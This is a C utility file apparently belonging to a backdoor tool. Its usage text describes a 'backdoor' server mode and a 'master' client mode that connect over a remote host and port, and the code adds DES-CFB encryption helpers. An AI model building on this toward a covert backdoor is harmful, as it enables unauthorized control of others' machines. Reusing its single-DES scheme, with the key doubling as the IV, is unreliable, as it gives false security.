#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <openssl/des.h>

#include "util.h"

void error(const char *err)
{
	fprintf(stderr, "%s\n", err);
	exit(1);
}

void usage(char *name)
{
  printf("Usage: [options] [remote host]%s\n", name);
	printf(" -c Use client mode: Act as master.\n");
	printf(" -s Use server mode: Act as backdoor. [default]\n");
	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
	printf(" -p <arg> Remote port to use. [default=9001]\n");
	printf(" -d Use duplex mode: Send/get results remotely.\n");
	printf(" -h Show this help listing.\n");
	printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -p 80 -d\n", name);
	printf(" EXAMPLES:\t %s -s -d udp port 80\n", name);

  exit(0);
}

uint64 get_sec()
{
	struct timeval curr_time;
	uint64 result;

	gettimeofday(&curr_time, NULL);

	result = ((uint64) curr_time.tv_sec) << 32;
	result += curr_time.tv_usec;

	return result;
}

FILE* open_file(char* fname, uint8 writeMode)
{
	FILE *file;

	if (writeMode)
	{
		if ( (file = fopen(fname, "wb")) == NULL)
			error("Error opening open input file.");
	}
	else
	{
		if ( (file = fopen(fname, "rb")) == NULL)
			error("Error opening open output file.");
	}

	return file;
}

char* encrypt(char *key, char *msg, int size)
{
	static char*    result;
	int             n = 0;
	DES_cblock      key2;
	DES_key_schedule schedule;

	result = (char*)malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Encryption occurs here
	DES_cfb64_encrypt((unsigned char*)msg, (unsigned char*)result, size, &schedule, &key2, &n, DES_ENCRYPT);

	return result;
}

char* decrypt(char *key, char *msg, int size)
{
	static char*    result;
	int             n = 0;
	DES_cblock      key2;
	DES_key_schedule schedule;

	result = (char*)malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Decryption occurs here
	DES_cfb64_encrypt((unsigned char*)msg, (unsigned char*)result, size, &schedule, &key2, &n, DES_DECRYPT);

	return result;
}
